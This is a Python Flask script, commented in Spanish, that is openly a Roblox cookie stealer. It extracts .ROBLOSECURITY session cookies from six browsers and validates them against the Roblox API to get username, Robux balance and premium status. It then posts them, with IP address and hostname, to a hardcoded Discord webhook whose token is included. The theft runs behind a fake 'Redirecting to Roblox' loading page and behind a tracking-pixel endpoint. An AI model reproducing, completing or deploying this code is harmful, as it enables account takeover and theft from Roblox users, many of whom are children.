from flask import Flask, request, Response, redirect, jsonify
import requests
import json
from datetime import datetime
import os
import base64
import browser_cookie3
import threading
import socket

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Imagen pixel transparente
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

def get_host_info():
    """Obtiene información del host"""
    try:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        return hostname, IPAddr
    except:
        return "Unknown", "Unknown"

def chrome_logger():
    """Extrae cookies de Chrome"""
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        if '.ROBLOSECURITY=' in cookies:
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
    except:
        pass
    return None

def firefox_logger():
    """Extrae cookies de Firefox"""
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        if '.ROBLOSECURITY=' in cookies:
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
    except:
        pass
    return None

def opera_logger():
    """Extrae cookies de Opera"""
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        if '.ROBLOSECURITY=' in cookies:
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
    except:
        pass
    return None

def edge_logger():
    """Extrae cookies de Edge"""
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        if '.ROBLOSECURITY=' in cookies:
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
    except:
        pass
    return None

def brave_logger():
    """Extrae cookies de Brave"""
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        cookies = str(cookies)
        if '.ROBLOSECURITY=' in cookies:
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
    except:
        pass
    return None

def chromium_logger():
    """Extrae cookies de Chromium"""
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        cookies = str(cookies)
        if '.ROBLOSECURITY=' in cookies:
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
    except:
        pass
    return None

def extract_all_cookies():
    """Intenta extraer cookies de TODOS los navegadores"""
    results = {}
    
    browsers = [
        ("Chrome", chrome_logger),
        ("Firefox", firefox_logger),
        ("Opera", opera_logger),
        ("Edge", edge_logger),
        ("Brave", brave_logger),
        ("Chromium", chromium_logger)
    ]
    
    threads = []
    
    for browser_name, browser_func in browsers:
        thread = threading.Thread(target=lambda bn=browser_name, bf=browser_func: results.update({bn: bf()}))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    return results

def verify_roblox_cookie(cookie):
    """Verifica cookie de Roblox con la API"""
    try:
        session = requests.Session()
        session.cookies['.ROBLOSECURITY'] = cookie
        response = session.get('https://www.roblox.com/mobileapi/userinfo')
        
        if response.status_code == 200:
            data = response.json()
            return {
                "valid": True,
                "username": data.get('UserName', 'Unknown'),
                "user_id": data.get('UserID', 'Unknown'),
                "robux": data.get('RobuxBalance', 0),
                "premium": data.get('IsPremium', False),
                "avatar": data.get('ThumbnailUrl', 'https://www.roblox.com/asset/?id=123456789')
            }
        else:
            return {"valid": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def send_to_discord(browser_results, ip, user_agent):
    """Envía los resultados a Discord"""
    try:
        hostname, ip_local = get_host_info()
        
        fields = [
            {"name": "🌐 IP Pública", "value": str(ip), "inline": True},
            {"name": "💻 Hostname", "value": hostname, "inline": True},
            {"name": "🔌 IP Local", "value": ip_local, "inline": True},
            {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": True},
            {"name": "📅 Fecha/Hora", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
        ]
        
        # Procesar cada navegador
        cookies_found = False
        for browser_name, cookie in browser_results.items():
            if cookie:
                cookies_found = True
                user_info = verify_roblox_cookie(cookie)
                
                fields.append({"name": f"🌍 {browser_name}", "value": "✅ Cookie encontrada", "inline": True})
                fields.append({"name": f"🔴 .ROBLOSECURITY ({browser_name})", "value": f"```{cookie}```", "inline": False})
                
                if user_info.get('valid'):
                    fields.append({"name": f"👤 Username ({browser_name})", "value": user_info['username'], "inline": True})
                    fields.append({"name": f"🆔 User ID ({browser_name})", "value": str(user_info['user_id']), "inline": True})
                    fields.append({"name": f"💰 Robux ({browser_name})", "value": str(user_info['robux']), "inline": True})
                    fields.append({"name": f"⭐ Premium ({browser_name})", "value": "✅ Sí" if user_info['premium'] else "❌ No", "inline": True})
                else:
                    fields.append({"name": f"❌ Cookie inválida ({browser_name})", "value": user_info.get('error', 'Error desconocido'), "inline": True})
            else:
                fields.append({"name": f"🌍 {browser_name}", "value": "❌ No encontrada", "inline": True})
        
        if not cookies_found:
            fields.append({"name": "❌ RESULTADO", "value": "No se encontraron cookies de Roblox en ningún navegador", "inline": False})
        
        embed = {
            "title": f"🎯 BROWSER COOKIE LOGGER - {hostname}",
            "color": 16711680 if cookies_found else 16776960,
            "fields": fields,
            "footer": {"text": "Cookie Logger - Browser_cookie3"}
        }
        
        payload = {
            "content": "@everyone **🚨 COOKIES EXTRAÍDAS**" if cookies_found else "@here **⚠️ Intento de extracción**",
            "embeds": [embed]
        }
        
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"Enviado a Discord: {response.status_code}")
        
    except Exception as e:
        print(f"Error: {e}")

@app.route('/')
def index():
    """Página principal que ejecuta browser_cookie3"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redireccionando...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f0f0;
            margin: 0;
        }
        .loading {
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <h2>Redireccionando a Roblox...</h2>
        <p>Por favor espera un momento.</p>
    </div>
    
    <script>
        // Redirigir a Roblox después de 1 segundo
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/home';
        }, 1000);
    </script>
</body>
</html>"""
    
    # Ejecutar extracción de cookies en segundo plano
    browser_results = extract_all_cookies()
    send_to_discord(browser_results, ip, user_agent)
    
    return html

@app.route('/pixel.png')
def pixel():
    """Endpoint para pixel tracker"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Ejecutar extracción de cookies
    browser_results = extract_all_cookies()
    send_to_discord(browser_results, ip, user_agent)
    
    return Response(PIXEL, mimetype='image/png')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
